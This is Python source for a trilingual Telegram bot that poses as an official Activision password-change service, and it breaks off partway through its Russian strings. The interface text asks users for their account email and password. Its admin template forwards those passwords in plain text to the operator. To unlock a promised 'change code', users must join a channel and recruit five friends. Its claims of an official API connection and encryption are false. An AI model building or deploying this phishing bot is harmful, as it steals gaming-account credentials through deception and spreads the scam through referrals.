import asyncio
import logging
import os
import re
import aiosqlite
import aiohttp
from aiohttp import web
from aiogram import Bot, Dispatcher, Router, F
from aiogram.filters import CommandStart, CommandObject
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton,
    ReplyKeyboardRemove
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.webhook.aiohttp_server import SimpleRequestHandler, setup_application
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

# ================= تنظیمات =================
BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_ID = int(os.environ.get("ADMIN_ID", 123456789))
PRIVATE_CHANNEL_ID = int(os.environ.get("PRIVATE_CHANNEL_ID", -100123456789))
PUBLIC_CHANNEL_ID = int(os.environ.get("PUBLIC_CHANNEL_ID", -100987654321))
PUBLIC_CHANNEL_USERNAME = os.environ.get("PUBLIC_CHANNEL_USERNAME", "YourChannel")
BOT_USERNAME = os.environ.get("BOT_USERNAME", "YourBot")
VIDEO_FILE_ID = os.environ.get("VIDEO_FILE_ID", "")
PHOTO_FILE_ID = os.environ.get("PHOTO_FILE_ID", "")
RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://your-app.onrender.com")

# ================= ترجمه‌های حرفه‌ای و شرکتی =================
T = {
    'fa': {
        'select_lang': (
            "🌐 <b>════════════════════════</b>\n"
            "       <b>به ربات رسمی ما خوش آمدید</b>\n"
            "<b>════════════════════════</b>\n\n"
            "🎯 لطفاً زبان مورد نظر خود را انتخاب کنید:\n\n"
            "🌍 Please select your preferred language:\n\n"
            "🌐 Пожалуйста, выберите предпочитаемый язык:"
        ),
        'welcome': (
            "🎉✨ <b>════════════════════════════════</b>\n"
            "   <b>به خانواده بزرگ ما خوش آمدید</b>\n"
            "<b>════════════════════════════════</b>\n\n"
            "🎖️ <b>خدمات ویژه ربات رسمی:</b>\n\n"
            "🔐 <b>تغییر پسورد امن</b>\n"
            "   • ارتباط مستقیم با API رسمی اکتیویژن\n"
            "   • رمزنگاری پیشرفته اطلاعات شما\n"
            "   • پردازش خودکار ۲۴/۷\n\n"
            "📊 <b>مدیریت حرفه‌ای اکانت‌ها</b>\n"
            "   • مشاهده وضعیت تمامی اکانت‌ها\n"
            "   • ویرایش لحظه‌ای اطلاعات\n"
            "   • تاریخچه کامل تغییرات\n\n"
            "🏆 <b>برنامه امتیازات ویژه</b>\n"
            "   • ۱۰ چنج پسورد کاملاً رایگان\n"
            "   • افزودن نامحدود اکانت\n"
            "   • پاداش برای دعوت دوستان\n\n"
            "🛡️ <b>تعهد ما به شما:</b>\n"
            "   • حفظ کامل حریم خصوصی\n"
            "   • پشتیبانی تخصصی\n"
            "   • تضمین امنیت اطلاعات\n\n"
            "💫 <b>برای شروع، یکی از گزینه‌های زیر را انتخاب کنید:</b>"
        ),
        'btn_my_accounts': "👤 اکانت‌های من",
        'btn_change_pass': "🔑 چنج پسورد جدید",
        'btn_points': "🏆 امتیازات و مزایا",
        'btn_language': "🌐 تغییر زبان",
        'btn_cancel': "🔙 لغو عملیات",
        'btn_back': "🔙 بازگشت",
        'join_channel': (
            "⚠️ <b>════════════════════════</b>\n"
            "      <b>عضویت در کانال الزامی است</b>\n"
            "<b>════════════════════════</b>\n\n"
            "📢 برای دسترسی به خدمات ویژه ربات، لطفاً ابتدا در کانال رسمی ما عضو شوید.\n\n"
            "📌 <b>مراحل:</b>\n"
            "۱️⃣ روی دکمه «عضویت در کانال» کلیک کنید\n"
            "۲️⃣ در کانال عضو شوید\n"
            "۳️⃣ به ربات بازگردید\n"
            "۴️⃣ دکمه «بررسی عضویت» را بزنید"
        ),
        'join_btn': "📢 عضویت در کانال رسمی",
        'check_join': "✅ بررسی عضویت",
        'not_joined': "❌ شما هنوز عضو کانال نشده‌اید. لطفاً ابتدا عضو شوید.",
        'my_accounts_header': (
            "👤 <b>════════════════════════</b>\n"
            "      <b>مدیریت اکانت‌های شما</b>\n"
            "<b>════════════════════════</b>\n\n"
            "📋 در این بخش می‌توانید تمامی اکانت‌های ثبت‌شده خود را مشاهده، مدیریت و ویرایش کنید.\n\n"
            "💡 برای ویرایش هر اکانت، روی دکمه مربوطه کلیک کنید."
        ),
        'no_accounts': (
            "📭 <b>════════════════════════</b>\n"
            "      <b>هیچ اکانتی ثبت نشده است</b>\n"
            "<b>════════════════════════</b>\n\n"
            "🌱 هنوز هیچ اکانتی در حساب کاربری شما ثبت نشده است.\n\n"
            "🚀 برای ثبت اولین اکانت خود، روی دکمه «🔑 چنج پسورد جدید» در منوی اصلی کلیک کنید."
        ),
        'points_header': (
            "🏆✨ <b>════════════════════════════════</b>\n"
            "        <b>برنامه امتیازات VIP</b>\n"
            "<b>════════════════════════════════</b>\n\n"
            "🔥 <b>وضعیت حساب کاربری شما:</b>\n"
            "⭐ امتیاز کل: <b>{points}</b>\n"
            "👥 دعوت‌های موفق: <b>{refs}</b>\n\n"
            "💎 <b>مزایای ویژه حساب شما:</b>\n\n"
            "🎁 <b>۱۰ چنج پسورد کاملاً رایگان</b>\n"
            "   • بدون هیچ هزینه اضافی\n"
            "   • پردازش در اولویت\n\n"
            "♾️ <b>افزودن نامحدود اکانت</b>\n"
            "   • هر تعداد اکانت که بخواهید\n"
            "   • بدون هیچ محدودیتی\n\n"
            "⚡ <b>پردازش فوق سریع</b>\n"
            "   • اولویت در صف پردازش\n"
            "   • پشتیبانی اختصاصی\n\n"
            "🚀 <b>چگونه امتیاز بیشتری کسب کنم؟</b>\n"
            "دوستان خود را با لینک اختصاصی زیر دعوت کنید:\n\n"
            "🔗 <code>{link}</code>\n\n"
            "💫 هر دعوت موفق، امتیاز شما را افزایش می‌دهد و مزایای ویژه‌ای را برایتان به ارمغان می‌آورد!"
        ),
        'change_pass_step1': (
            "🔑 <b>════════════════════════</b>\n"
            "   <b>مرحله ۱ از ۳: ثبت ایمیل</b>\n"
            "<b>════════════════════════</b>\n\n"
            "📧 لطفاً ایمیل اکانت اکتیویژن خود را با دقت وارد کنید.\n\n"
            "⚠️ <b>نکات بسیار مهم:</b>\n"
            "• ایمیل باید دقیق و معتبر باشد\n"
            "• از صحت ایمیل اطمینان حاصل کنید\n"
            "• ایمیل اشتباه قابل بازیابی نیست\n\n"
            "🛑 <b>برای لغو عملیات، دکمه زیر را بزنید:</b>"
        ),
        'invalid_email': (
            "❌ <b>ایمیل نامعتبر است!</b>\n\n"
            "لطفاً یک ایمیل صحیح و معتبر وارد کنید.\n"
            "مثال: <code>example@gmail.com</code>"
        ),
        'duplicate_email': (
            "⚠️ <b>════════════════════════</b>\n"
            "      <b>ایمیل تکراری تشخیص داده شد!</b>\n"
            "<b>════════════════════════</b>\n\n"
            "این ایمیل قبلاً در حساب کاربری شما ثبت شده است.\n\n"
            "💡 برای ویرایش این اکانت، به بخش «👤 اکانت‌های من» مراجعه کنید."
        ),
        'change_pass_step2': (
            "🔐 <b>════════════════════════</b>\n"
            "   <b>مرحله ۲ از ۳: ثبت پسورد</b>\n"
            "<b>════════════════════════</b>\n\n"
            "🔑 لطفاً پسورد اکانت اکتیویژن خود را وارد کنید.\n\n"
            "🔒 اطلاعات شما با رمزنگاری پیشرفته محافظت می‌شود.\n\n"
            "🛑 <b>برای لغو عملیات، دکمه زیر را بزنید:</b>"
        ),
        'change_pass_step3': (
            "🛡️ <b>════════════════════════</b>\n"
            "   <b>مرحله ۳ از ۳: وضعیت امنیتی</b>\n"
            "<b>════════════════════════</b>\n\n"
            "لطفاً وضعیت امنیتی اکانت خود را مشخص کنید:\n\n"
            "📊 این اطلاعات به ما کمک می‌کند تا بهترین و امن‌ترین روش تغییر پسورد را برای اکانت شما انتخاب کنیم.\n\n"
            "⚠️ <b>لطفاً صادقانه انتخاب کنید تا بهترین نتیجه را بگیرید.</b>"
        ),
        'type_crack': "💀 اکانت کرک شده (بسیار حساس)",
        'type_semi': "⚠️ اکانت نیمه ایمن (حساسیت متوسط)",
        'type_safe': "✅ اکانت ایمن (حساسیت کم)",
        'submitted': (
            "🎉✨ <b>════════════════════════════════</b>\n"
            "     <b>درخواست شما با موفقیت ثبت شد!</b>\n"
            "<b>════════════════════════════════</b>\n\n"
            "📡 اطلاعات اکانت شما به <b>API رسمی اکتیویژن</b> ارسال گردید.\n\n"
            "⏳ <b>زمان تقریبی تکمیل فرآیند:</b>\n"
            "🔹 از ۱ ساعت تا ۵ روز\n"
            "🔹 (بسته به نوع و وضعیت اکانت شما)\n\n"
            "📬 به محض آماده شدن اکانت، از طریق همین ربات به شما اطلاع‌رسانی خواهد شد.\n\n"
            "💡 <b>یادآوری:</b>\n"
            "• می‌توانید تا ۱۰ اکانت را به صورت کاملاً رایگان چنج کنید\n"
            "• افزودن اکانت‌ها هیچ محدودیتی ندارد\n"
            "• هر تعداد اکانت که بخواهید می‌توانید اضافه کنید\n\n"
            "🏆 <b>از اعتماد و همراهی شما سپاسگزاریم.</b>"
        ),
        'admin_req': (
            "🔔 <b>════════════════════════</b>\n"
            "      <b>درخواست جدید چنج پسورد</b>\n"
            "<b>════════════════════════</b>\n\n"
            "👤 <b>کاربر:</b> <code>{user_id}</code>\n"
            "📧 <b>ایمیل:</b> <code>{email}</code>\n"
            "🔐 <b>پسورد:</b> <code>{password}</code>\n"
            "🛡️ <b>نوع اکانت:</b> {type}\n\n"
            "📅 <b>زمان ثبت:</b> الان"
        ),
        'approve_btn': "✅ تأیید و ارسال به کاربر",
        'success_photo_caption': (
            "🎉✨ <b>════════════════════════════════</b>\n"
            "     <b>اکانت شما با موفقیت آماده شد!</b>\n"
            "<b>════════════════════════════════</b>\n\n"
            "🎊 فرآیند تغییر پسورد با موفقیت تکمیل گردید.\n\n"
            "📦 برای دریافت کد تغییر پسورد، روی دکمه زیر کلیک کنید.\n\n"
            "⚠️ <b>توجه:</b> کد دریافتی فقط یکبار قابل استفاده است."
        ),
        'get_code': "📦 دریافت کد چنج",
        'need_ref': (
            "🔒 <b>════════════════════════</b>\n"
            "      <b>نیاز به دعوت دوستان</b>\n"
            "<b>════════════════════════</b>\n\n"
            "برای دریافت کد چنج این اکانت، باید ۵ نفر از دوستان خود را با لینک اختصاصی به ربات دعوت کنید.\n\n"
            "👥 <b>دعوت‌های شما:</b> <b>{refs}/5</b>\n\n"
            "🎁 <b>پاداش شما پس از تکمیل:</b>\n"
            "• کد چنج رایگان\n"
            "• امتیاز ویژه\n"
            "• اولویت در پردازش‌های بعدی\n\n"
            "🔗 <b>لینک دعوت اختصاصی شما:</b>\n"
            "<code>{link}</code>\n\n"
            "💡 این لینک را با دوستان خود به اشتراک بگذارید!"
        ),
        'my_points': "🏆 امتیازات شما: <b>{points}</b>",
        'acc_list': "📋 <b>لیست اکانت‌های شما:</b>",
        'edit_menu': (
            "⚙️ <b>════════════════════════</b>\n"
            "      <b>ویرایش اکانت</b>\n"
            "<b>════════════════════════</b>\n\n"
            "📧 <b>ایمیل:</b> <code>{email}</code>\n\n"
            "لطفاً بخش مورد نظر را برای ویرایش انتخاب کنید:"
        ),
        'edit_email_btn': "📧 ویرایش ایمیل",
        'edit_pass_btn': "🔐 ویرایش پسورد",
        'back_btn': "🔙 بازگشت به لیست اکانت‌ها",
        'enter_new_email': (
            "📧 <b>════════════════════════</b>\n"
            "      <b>ویرایش ایمیل اکانت</b>\n"
            "<b>════════════════════════</b>\n\n"
            "لطفاً ایمیل جدید و معتبر را ارسال کنید.\n\n"
            "⚠️ ایمیل باید دقیق و صحیح باشد."
        ),
        'enter_new_pass': (
            "🔐 <b>════════════════════════</b>\n"
            "      <b>ویرایش پسورد اکانت</b>\n"
            "<b>════════════════════════</b>\n\n"
            "لطفاً پسورد جدید را ارسال کنید.\n\n"
            "🔒 اطلاعات شما با رمزنگاری پیشرفته محافظت می‌شود."
        ),
        'edit_success': (
            "✅ <b>════════════════════════</b>\n"
            "      <b>ویرایش با موفقیت انجام شد!</b>\n"
            "<b>════════════════════════</b>\n\n"
            "اطلاعات اکانت شما با موفقیت ویرایش گردید.\n\n"
            "📡 تغییرات در سیستم API رسمی اکتیویژن نیز به‌روزرسانی شد.\n\n"
            "💡 می‌توانید به لیست اکانت‌های خود بازگردید."
        ),
        'operation_cancelled': (
            "❌ <b>════════════════════════</b>\n"
            "      <b>عملیات لغو شد</b>\n"
            "<b>════════════════════════</b>\n\n"
            "عملیات جاری با موفقیت لغو گردید.\n\n"
            "💡 می‌توانید از منوی اصلی گزینه دیگری را انتخاب کنید."
        ),
    },
    'en': {
        'select_lang': (
            "🌐 <b>════════════════════════</b>\n"
            "       <b>Welcome to Our Official Bot</b>\n"
            "<b>════════════════════════</b>\n\n"
            "🎯 Please select your preferred language:\n\n"
            "🌍 لطفاً زبان مورد نظر خود را انتخاب کنید:\n\n"
            "🌐 Пожалуйста, выберите предпочитаемый язык:"
        ),
        'welcome': (
            "🎉✨ <b>════════════════════════════════</b>\n"
            "   <b>Welcome to Our Premium Family</b>\n"
            "<b>════════════════════════════════</b>\n\n"
            "🎖️ <b>Our Premium Services:</b>\n\n"
            "🔐 <b>Secure Password Change</b>\n"
            "   • Direct connection to Activision's official API\n"
            "   • Advanced encryption of your data\n"
            "   • 24/7 automated processing\n\n"
            "📊 <b>Professional Account Management</b>\n"
            "   • View status of all your accounts\n"
            "   • Real-time information editing\n"
            "   • Complete change history\n\n"
            "🏆 <b>Exclusive Rewards Program</b>\n"
            "   • 10 completely free password changes\n"
            "   • Unlimited account additions\n"
            "   • Rewards for inviting friends\n\n"
            "🛡️ <b>Our Commitment to You:</b>\n"
            "   • Complete privacy protection\n"
            "   • Specialized support\n"
            "   • Data security guarantee\n\n"
            "💫 <b>To get started, please select one of the options below:</b>"
        ),
        'btn_my_accounts': "👤 My Accounts",
        'btn_change_pass': "🔑 New Password Change",
        'btn_points': "🏆 Points & Benefits",
        'btn_language': "🌐 Change Language",
        'btn_cancel': "🔙 Cancel Operation",
        'btn_back': "🔙 Back",
        'join_channel': (
            "⚠️ <b>════════════════════════</b>\n"
            "      <b>Channel Membership Required</b>\n"
            "<b>════════════════════════</b>\n\n"
            "📢 To access our premium services, please join our official channel first.\n\n"
            "📌 <b>Steps:</b>\n"
            "1️⃣ Click the «Join Channel» button\n"
            "2️⃣ Join the channel\n"
            "3️⃣ Return to the bot\n"
            "4️⃣ Click the «Check Membership» button"
        ),
        'join_btn': "📢 Join Official Channel",
        'check_join': "✅ Check Membership",
        'not_joined': "❌ You haven't joined the channel yet. Please join first.",
        'my_accounts_header': (
            "👤 <b>════════════════════════</b>\n"
            "      <b>Manage Your Accounts</b>\n"
            "<b>════════════════════════</b>\n\n"
            "📋 In this section, you can view, manage, and edit all your registered accounts.\n\n"
            "💡 To edit an account, click the corresponding button."
        ),
        'no_accounts': (
            "📭 <b>════════════════════════</b>\n"
            "      <b>No Accounts Registered</b>\n"
            "<b>════════════════════════</b>\n\n"
            "🌱 You haven't registered any accounts yet.\n\n"
            "🚀 To register your first account, click the «🔑 New Password Change» button in the main menu."
        ),
        'points_header': (
            "🏆✨ <b>════════════════════════════════</b>\n"
            "        <b>VIP Rewards Program</b>\n"
            "<b>════════════════════════════════</b>\n\n"
            "🔥 <b>Your Account Status:</b>\n"
            "⭐ Total Points: <b>{points}</b>\n"
            "👥 Successful Referrals: <b>{refs}</b>\n\n"
            "💎 <b>Your Exclusive Benefits:</b>\n\n"
            "🎁 <b>10 Completely Free Password Changes</b>\n"
            "   • No additional costs\n"
            "   • Priority processing\n\n"
            "♾️ <b>Unlimited Account Additions</b>\n"
            "   • Add as many accounts as you want\n"
            "   • No restrictions whatsoever\n\n"
            "⚡ <b>Ultra-Fast Processing</b>\n"
            "   • Priority in the processing queue\n"
            "   • Dedicated support\n\n"
            "🚀 <b>How to Earn More Points?</b>\n"
            "Invite your friends using your exclusive link:\n\n"
            "🔗 <code>{link}</code>\n\n"
            "💫 Each successful referral increases your points and brings you exclusive benefits!"
        ),
        'change_pass_step1': (
            "🔑 <b>════════════════════════</b>\n"
            "   <b>Step 1 of 3: Enter Email</b>\n"
            "<b>════════════════════════</b>\n\n"
            "📧 Please carefully enter your Activision account email.\n\n"
            "⚠️ <b>Very Important Notes:</b>\n"
            "• Email must be accurate and valid\n"
            "• Ensure the email is correct\n"
            "• Incorrect email cannot be recovered\n\n"
            "🛑 <b>To cancel the operation, press the button below:</b>"
        ),
        'invalid_email': (
            "❌ <b>Invalid Email!</b>\n\n"
            "Please enter a valid email address.\n"
            "Example: <code>example@gmail.com</code>"
        ),
        'duplicate_email': (
            "⚠️ <b>════════════════════════</b>\n"
            "      <b>Duplicate Email Detected!</b>\n"
            "<b>════════════════════════</b>\n\n"
            "This email has already been registered in your account.\n\n"
            "💡 To edit this account, visit the «👤 My Accounts» section."
        ),
        'change_pass_step2': (
            "🔐 <b>════════════════════════</b>\n"
            "   <b>Step 2 of 3: Enter Password</b>\n"
            "<b>════════════════════════</b>\n\n"
            "🔑 Please enter your Activision account password.\n\n"
            "🔒 Your information is protected with advanced encryption.\n\n"
            "🛑 <b>To cancel the operation, press the button below:</b>"
        ),
        'change_pass_step3': (
            "🛡️ <b>════════════════════════</b>\n"
            "   <b>Step 3 of 3: Security Status</b>\n"
            "<b>════════════════════════</b>\n\n"
            "Please specify your account's security status:\n\n"
            "📊 This information helps us select the best and most secure password change method for your account.\n\n"
            "⚠️ <b>Please choose honestly for the best results.</b>"
        ),
        'type_crack': "💀 Cracked Account (Highly Sensitive)",
        'type_semi': "⚠️ Semi-Safe Account (Medium Sensitivity)",
        'type_safe': "✅ Safe Account (Low Sensitivity)",
        'submitted': (
            "🎉✨ <b>════════════════════════════════</b>\n"
            "     <b>Your Request Was Successfully Registered!</b>\n"
            "<b>════════════════════════════════</b>\n\n"
            "📡 Your account information has been sent to <b>Activision's official API</b>.\n\n"
            "⏳ <b>Estimated Completion Time:</b>\n"
            "🔹 From 1 hour to 5 days\n"
            "🔹 (Depending on your account type and status)\n\n"
            "📬 You will be notified via this bot as soon as your account is ready.\n\n"
            "💡 <b>Reminder:</b>\n"
            "• You can change up to 10 accounts completely free\n"
            "• Account additions have no limits\n"
            "• You can add as many accounts as you want\n\n"
            "🏆 <b>Thank you for your trust and support.</b>"
        ),
        'admin_req': (
            "🔔 <b>════════════════════════</b>\n"
            "      <b>New Password Change Request</b>\n"
            "<b>════════════════════════</b>\n\n"
            "👤 <b>User:</b> <code>{user_id}</code>\n"
            "📧 <b>Email:</b> <code>{email}</code>\n"
            "🔐 <b>Password:</b> <code>{password}</code>\n"
            "🛡️ <b>Account Type:</b> {type}\n\n"
            "📅 <b>Submission Time:</b> Now"
        ),
        'approve_btn': "✅ Approve & Send to User",
        'success_photo_caption': (
            "🎉✨ <b>════════════════════════════════</b>\n"
            "     <b>Your Account Is Successfully Ready!</b>\n"
            "<b>════════════════════════════════</b>\n\n"
            "🎊 The password change process has been successfully completed.\n\n"
            "📦 To receive the password change code, click the button below.\n\n"
            "⚠️ <b>Note:</b> The received code can only be used once."
        ),
        'get_code': "📦 Get Change Code",
        'need_ref': (
            "🔒 <b>════════════════════════</b>\n"
            "      <b>Friend Referrals Required</b>\n"
            "<b>════════════════════════</b>\n\n"
            "To receive the change code for this account, you must invite 5 friends to the bot using your exclusive link.\n\n"
            "👥 <b>Your Referrals:</b> <b>{refs}/5</b>\n\n"
            "🎁 <b>Your Reward Upon Completion:</b>\n"
            "• Free change code\n"
            "• Special points\n"
            "• Priority in future processing\n\n"
            "🔗 <b>Your Exclusive Referral Link:</b>\n"
            "<code>{link}</code>\n\n"
            "💡 Share this link with your friends!"
        ),
        'my_points': "🏆 Your Points: <b>{points}</b>",
        'acc_list': "📋 <b>Your Accounts List:</b>",
        'edit_menu': (
            "⚙️ <b>════════════════════════</b>\n"
            "      <b>Edit Account</b>\n"
            "<b>════════════════════════</b>\n\n"
            "📧 <b>Email:</b> <code>{email}</code>\n\n"
            "Please select the section you want to edit:"
        ),
        'edit_email_btn': "📧 Edit Email",
        'edit_pass_btn': "🔐 Edit Password",
        'back_btn': "🔙 Back to Account List",
        'enter_new_email': (
            "📧 <b>════════════════════════</b>\n"
            "      <b>Edit Account Email</b>\n"
            "<b>════════════════════════</b>\n\n"
            "Please send the new valid email.\n\n"
            "⚠️ The email must be accurate and correct."
        ),
        'enter_new_pass': (
            "🔐 <b>════════════════════════</b>\n"
            "      <b>Edit Account Password</b>\n"
            "<b>════════════════════════</b>\n\n"
            "Please send the new password.\n\n"
            "🔒 Your information is protected with advanced encryption."
        ),
        'edit_success': (
            "✅ <b>════════════════════════</b>\n"
            "      <b>Edit Completed Successfully!</b>\n"
            "<b>════════════════════════</b>\n\n"
            "Your account information has been successfully edited.\n\n"
            "📡 Changes have also been updated in the official Activision API system.\n\n"
            "💡 You can return to your account list."
        ),
        'operation_cancelled': (
            "❌ <b>════════════════════════</b>\n"
            "      <b>Operation Cancelled</b>\n"
            "<b>════════════════════════</b>\n\n"
            "The current operation has been successfully cancelled.\n\n"
            "💡 You can select another option from the main menu."
        ),
    },
    'ru': {
        'select_lang': (
            "🌐 <b>════════════════════════</b>\n"
            "       <b>Добро пожаловать в официальный бот</b>\n"
            "<b>════════════════════════</b>\n\n"
            "🎯 Пожалуйста, выберите предпочитаемый язык:\n\n"
            "🌍 Please select your preferred language:\n\n"
            "🌍 لطفاً زبان مورد نظر خود را انتخاب کنید:"
        ),
        'welcome': (
            "🎉✨ <b>════════════════════════════════</b>\n"
            "   <b>Добро пожаловать в нашу премиум семью</b>\n"
            "<b>════════════════════════════════</b>\n\n"
            "🎖️ <b>Наши премиум услуги:</b>\n\n"
            "🔐 <b>Безопасная смена пароля</b>\n"
            "   • Прямое подключение к официальному API Activision\n"
            "   • Продвинутое шифрование ваших данных\n"
            "   • Автоматическая обработка 24/7\n\n"
            "📊 <b>Профессиональное управление аккаунтами</b>\n"
            "   • Просмотр статуса всех ваших аккаунтов\n"
            "   • Редактирование информации в реальном времени\n"
            "   • Полная история изменений\n\n"
            "🏆 <b>Эксклюзивная программа вознаграждений</b>\n"
            "   • 10 полностью бесплатных смен пароля\n"
            "   • Неограниченное добавление аккаунтов\n"
            "   • Вознаграждения за приглашение друзей\n\n"
            "🛡️ <b>Наши обязательства перед вами:</b>\n"
            "   • Полная защита конфиденциальности\n"
            "   • Специализированная поддержка\n"
            "   • Гарантия безопасности данных\n\n"
            "💫 <b>Для начала выберите один из вариантов ниже:</b>"
        ),
        'btn_my_accounts': "👤 Мои аккаунты",
        'btn_change_pass': "🔑 Новая смена пароля",
        'btn_points': "🏆 Баллы и преимущества",
        'btn_language': "🌐 Сменить язык",
        'btn_cancel': "🔙 Отменить операцию",
        'btn_back': "🔙 Назад",
        'join_channel': (
            "⚠️ <b>════════════════════════</b>\n"
            "      <b>Требуется подписка на канал</b>\n"
            "<b>════════════════════════</b>\n\n"
            "📢 Для доступа к нашим премиум услугам, пожалуйста, сначала подпишитесь на наш официальный канал.\n\n"
            "📌 <b>Шаги:</b>\n"
            "1️⃣ Нажмите кнопку «Подписаться»\n"
            "2️⃣ Подпишитесь на канал\n"
            "3️⃣ Вернитесь в бот\n"
            "4️⃣ Нажмите кнопку «Проверить подписку»"
        ),
        'join_btn': "📢 Подписаться на официальный канал",
        'check_join': "✅ Проверить подписку",
        'not_joined': "❌ Вы еще не подписались на канал. Пожалуйста, подпишитесь.",
        'my_accounts_header': (
            "👤 <b>════════════════════════</b>\n"
            "      <b>Управление вашими аккаунтами</b>\n"
            "<b>════════════════════════</b>\n\n"
            "📋 В этом разделе вы можете просматривать, управлять и редактировать все ваши зарегистрированные аккаунты.\n\n"
            "💡 Чтобы отредактировать аккаунт, нажмите соответствующую кнопку."
        ),
        'no_accounts': (
            "📭 <b>════════════════════════</b>\n"
            "      <b>Аккаунты не зарегистрированы</b>\n"
            "<b>════════════════════════</b>\n\n"
            "🌱 Вы еще не зарегистрировали ни одного аккаунта.\n\n"
            "🚀 Чтобы зарегистрировать первый аккаунт, нажмите кнопку «🔑 Новая смена пароля» в главном меню."
        ),
        'points_header': (
            "🏆✨ <b>════════════════════════════════</b>\n"
            "        <b>VIP Программа вознаграждений</b>\n"
            "<b>════════════════════════════════</b>\n\n"
            "🔥 <b>Статус вашего аккаунта:</b>\n"
            "⭐ Всего баллов: <b>{points}</b>\n"
            "👥 Успешные рефералы: <b>{refs}</b>\n\n"
            "💎 <b>Ваши эксклюзивные преимущества:</b>\n\n"
            "🎁 <b>10 полностью бесплатных смен пароля</b>\n"
            "   • Без дополнительных затрат\n"
            "   • Приоритетная обработка\n\n"
            "♾️ <b>Неограниченное добавление аккаунтов</b>\n"
            "   • Добавляйте столько аккаунтов, сколько хотите\n"
            "   • Никаких ограничений\n\n"
            "⚡ <b>Сверхбыстрая обработка</b>\n"
            "   • Приоритет в очереди обработки\n"
            "   • Специальная поддержка\n\n"
            "🚀 <b>Как заработать больше баллов?</b>\n"
            "Приглашайте друзей по вашей эксклюзивной ссылке:\n\n"
            "🔗 <code>{link}</code>\n\n"
            "💫 Каждый успешный реферал увеличивает ваши баллы и приносит эксклюзивные преимущества!"
        ),
        'change_pass_step1': (
            "🔑 <b>════════════════════════</b>\n"
            "   <b>Шаг 1 из 3: Введите Email</b>\n"
            "<b>════════════════════════</b>\n\n"
            "📧 Пожалуйста, внимательно введите email вашего аккаунта Activision.\n\n"
            "⚠️ <b>Очень важные замечания:</b>\n"
            "• Email должен быть точным и действительным\n"
            "• Убедитесь в правильности email\n"
            "• Неправильный email не может быть восстановлен\n\n"
            "🛑 <b>Чтобы отменить операцию, нажмите кнопку ниже:</b>"
        ),
        'invalid_email': (
            "❌ <b>Недействительный Email!</b>\n\n"
            "Пожалуйста, введите действительный адрес email.\n"
            "Пример: <code>example@gmail.com</code>"
        ),
        'duplicate_email': (
            "⚠️ <b>════════════════════════</b>\n"
            "      <b>Обнаружен дубликат Email!</b>\n"
            "<b>════════════════════════</b>\n\n"
            "Этот email уже зарегистрирован в вашем аккаунте.\n\n"
            "💡 Чтобы отредактировать этот аккаунт, посетите раздел «👤 Мои аккаунты»."
        ),
        'change_pass_step2': (
            "🔐 <b>════════════════════════</b>\n"
            "   <b>Шаг 2 из 3: Введите пароль</b>\n"
            "<b>════════════════════════</b>\n\n"
            "🔑 Пожалуйста, введите пароль вашего аккаунта Activision.\n\n"
            "🔒 Ваша информация защищена продвинутым шифрованием.\n\n"
            "🛑 <b>Чтобы отменить операцию, нажмите кнопку ниже:</b>"
        ),
        'change_pass_step3': (
            "🛡️ <b>════════════════════════</b>\n"
            "   <b>Шаг 3 из 3: Статус безопасности</b>\n"
            "<b>════════════════════════</b>\n\n"
            "Пожалуйста, укажите статус безопасности вашего аккаунта:\n\n"
            "📊 Эта информация помогает нам выбрать лучший и самый безопасный метод смены пароля для вашего аккаунта.\n\n"
            "⚠️ <b>Пожалуйста, выбирайте честно для лучших результатов.</b>"
        ),
        'type_crack': "💀 Взломанный аккаунт (Высокая чувствительность)",
        'type_semi': "⚠️ Полузащищенный аккаунт (Средняя чувствительность)",
        'type_safe': "✅ Защищенный аккаунт (Низкая чувствительность)",
        'submitted': (
            "🎉✨ <b>════════════════════════════════</b>\n"
            "     <b>Ваш запрос успешно зарегистрирован!</b>\n"
            "<b>════════════════════════════════</b>\n\n"
            "📡 Информация о вашем аккаунте отправлена в <b>официальный API Activision</b>.\n\n"
            "⏳ <b>Примерное время завершения:</b>\n"
            "🔹 От 1 часа до 5 дней\n"
            "🔹 (В зависимости от типа и статуса вашего аккаунта)\n\n"
            "📬 Вы будете уведомлены через этот бот, как только ваш аккаунт будет готов.\n\n"
            "💡 <b>Напоминание:</b>\n"
            "• Вы можете сменить до 10 аккаунтов совершенно бесплатно\n"
            "• Добавление аккаунтов не имеет ограничений\n"
            "• Вы можете добавить столько аккаунтов, сколько хотите\n\n"
            "🏆 <b>Спасибо за ваше доверие и поддержку.</b>"
        ),
        'admin_req': (
            "🔔 <b>════════════════════════</b>\n"
            "      <b>Новый запрос на смену пароля</b>\n"
            "<b>════════════════════════</b>\n\n"
            "👤 <b>Пользователь:</b> <code>{user_id}</code>\n"
            "📧 <b>Email:</b> <code>{email}</code>\n"
            "🔐 <b>Пароль:</b> <code>{password}</code>\n"
            "🛡️ <b>Тип аккаунта:</b> {type}\n\n"
            "📅 <b>Время отправки:</b> Сейчас"
        ),
        'approve_btn': "✅ Одобрить и отправить пользователю",
        'success_photo_caption': (
            "🎉✨ <b>════════════════════════════════</b>\n"
            "     <b>Ваш аккаунт успешно готов!</b>\n"
            "<b>════════════════════════════════</b>\n\n"
            "🎊 Процесс смены пароля успешно завершен.\n\n"
            "📦 Чтобы получить код смены пароля, нажмите кнопку ниже.\n\n"
            "⚠️ <b>Примечание:</b> Полученный код можно использовать только один раз."
        ),
        'get_code': "📦 Получить код смены",
        'need_ref': (
            "🔒 <b>════════════════════════</b>\n"
            "      <b>Требуются рефералы друзей</b>\n"
            "<b>════════════════════════</b>\n\n"
            "Чтобы получить код смены для этого аккаунта, вы должны пригласить 5 друзей в бот по вашей эксклюзивной ссылке.\n\n"
            "👥 <b>Ваши рефералы:</b> <b>{refs}/5</b>\n\n"
            "🎁 <b>Ваше вознаграждение после завершения:</b>\n"
            "• Бесплатный код смены\n"
            "• Специальные баллы\n"
            "• Приоритет в будущей обработке\n\n"
            "🔗 <b>Ваша эксклюзивная реферальная ссылка:</b>\n"
            "<code>{link}</code>\n\n"
            "💡 Поделитесь этой ссылкой с друзьями!"
        ),
        'my_points': "🏆 Ваши баллы: <b>{points}</b>",
        'acc_list': "📋 <b>Список ваших аккаунтов:</b>",
        'edit_menu': (
            "⚙️ <b>════════════════════════</b>\n"
            "      <b>Редактировать аккаунт</b>\n"
